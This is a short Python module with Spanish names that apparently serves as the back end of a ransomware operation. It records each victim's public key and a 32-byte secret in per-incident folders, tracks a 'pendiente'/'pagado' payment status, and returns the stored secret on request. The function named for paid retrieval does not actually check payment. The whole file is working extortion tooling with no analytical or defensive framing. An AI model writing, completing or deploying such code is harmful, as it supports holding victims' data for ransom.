from pathlib import Path

REGISTRO = Path("/datos/registro")
PUBLICO = Path("/datos/publico/ya-registrado")


def incorporar():
    if not PUBLICO.is_dir():
        return
    for carpeta in PUBLICO.iterdir():
        pk_v = carpeta / "pkV.der"
        destino = REGISTRO / "incidentes" / carpeta.name
        if not pk_v.is_file() or (destino / "pkV.der").is_file():
            continue
        destino.mkdir(parents=True, exist_ok=True)
        (destino / "pkV.der").write_bytes(pk_v.read_bytes())
        (destino / "pago").write_text("pendiente")


def anotar_victima(id_v, pk_v):
    destino = REGISTRO / "incidentes" / id_v.hex()
    pk_ruta = destino / "pkV.der"
    if pk_ruta.is_file():
        return False
    destino.mkdir(parents=True, exist_ok=True)
    pk_ruta.write_bytes(pk_v)
    (destino / "pago").write_text("pendiente")
    return True


def guardados():
    base = REGISTRO / "incidentes"
    if not base.is_dir():
        return []
    encontrados = []
    for carpeta in sorted(ruta for ruta in base.iterdir() if ruta.is_dir()):
        try:
            id_v = bytes.fromhex(carpeta.name)
        except ValueError:
            continue
        sv = carpeta / "sV"
        pk_v = carpeta / "pkV.der"
        pago = carpeta / "pago"
        if not (len(id_v) == 16 and sv.is_file() and pk_v.is_file() and pago.is_file()):
            continue
        if len(sv.read_bytes()) != 32:
            continue
        pk_v.read_bytes()
        encontrados.append((id_v, pago.read_text()))
    return encontrados


def guardar(id_v, sv):
    destino = REGISTRO / "incidentes" / id_v.hex()
    if not (destino / "pkV.der").is_file() or len(sv) != 32:
        raise LookupError("no-abre")
    (destino / "sV").write_bytes(sv)
    pago = destino / "pago"
    if not pago.is_file():
        pago.write_text("pendiente")

def marcar_pagado(id_v):
    pago = REGISTRO / "incidentes" / id_v.hex() / "pago"
    if not pago.is_file():
        raise LookupError("incidente")
    pago.write_text("pagado")


def leer_sv_pagado(id_v):
    """Devuelve sV (32 bytes) o lanza LookupError."""
    incidente = REGISTRO / "incidentes" / id_v.hex()
    sv = incidente / "sV"
    pk_v = incidente / "pkV.der"
    if not (sv.is_file() and pk_v.is_file()):
        raise LookupError("incidente")
    datos = sv.read_bytes()
    if len(datos) != 32:
        raise LookupError("sv")
    return datos, pk_v.read_bytes()
